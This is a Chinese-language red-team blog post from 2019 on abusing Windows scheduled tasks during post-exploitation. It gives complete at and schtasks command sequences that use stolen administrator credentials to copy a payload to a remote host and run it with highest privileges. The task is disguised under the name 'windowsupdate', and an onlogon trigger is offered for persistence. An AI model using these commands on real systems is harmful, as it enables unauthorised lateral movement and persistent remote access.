---
layout:     post
title:    Windows计划任务在后渗透中的应用
subtitle:   Windows计划任务在后渗透中的应用
date:       2019-11-21
author:     hmoytx
header-img: img/bg_02.jpg
catalog: true
tags:
    - 渗透测试
    - 红队
    - 内网渗透
---
# Windows计划任务在后渗透中的应用

## 简介
计划任务，顾名思义，指定时间做指定的事情，对windows来说可能是执行脚本，也可能是exe。计划任务的利用不仅仅在横向渗透中，也可以是在权限维持。  

## 利用前提
- 1.必须通过其他手段拿到本地或者域管理账号密码  
- 2.若在横向渗透过程中，要保证当前机器能net use远程到目标机器上  
- 3.目标机器开启了task scheduler服务


## 测试
对于XP或者2003以下的机器，基本都是用at来管理本地或者远程机器上的计划任务。这里没有搭建03的机器，就简单的列一下命令，解释一下。  
```
net use \\192.168.1.101\admin$ /user:"administrator” admin  #net use 连接
net time \\192.168.1.101   #查看远程主机时间
xcopy c:\payload.exe \\192.168.1.101\admin$\temp  #拷贝payload到远程主机对应目录下
at \\192.168.1.101 19:30 /every:5,10,15,20,25,30 c:\windows\temp\payload.exe
#设定计划任务，每月5,10,15,20,25,30日的19:30执行命令运行payload
```
设置完计划任务后可以通过以下命令查看：
```
at \\192.168.1.101
```
删除任务的话只需要加上参数/delete即可。  
这样会在指定日期的晚上七点半返回一个会话。  

对于win7之后的版本提供了一个更强大的工具--schtasks。  
对于远程连接还有上传payload的命令是和前面的一样的。  
利用schtasks创建任务：  
```
schtasks /create /s 192.168.1.102 /u “administrator” /p “123!@#” /RL HIGHEST /tn windowsupdate /tr C:\\Windows\temp\1.bat /sc DAILY /mo 1 /ST 19:30  #创建任务
schtasks /run /tn windowsupdate /s 192.168.1.102 /u “administrator” /p “123!@#” 
```
其中，RL表示作业级别，一般设置最高，为HIGHEST，tn是任务名称，tr是运行程序路径，sc表示时间间隔，DAILY表示以天为间隔，mo为执行周期，这里设置成了1天1次。  
拿到之后记得删除任务。  
```
schtasks /delete /tn windowsupdate /s 192.168.1.102 /u “administrator” /p "123!@#"
```
在本地执行的时候，不需要加/s参数去指定远程机器。   
![191121_1](/img/191121_beacon.png)  
直接上线。   

## 拓展
计划任务查询：
```
 schtasks /Query /tn windowsupdate /fo List /v
```
![191121_2](/img/191121_taskquery.png)  
这里我本地测试时候把sc参数改成了onlogon，只要在线，就反弹，还可以设置成其他的形式，结束会话就反弹等，这个根据实际需求设置。    


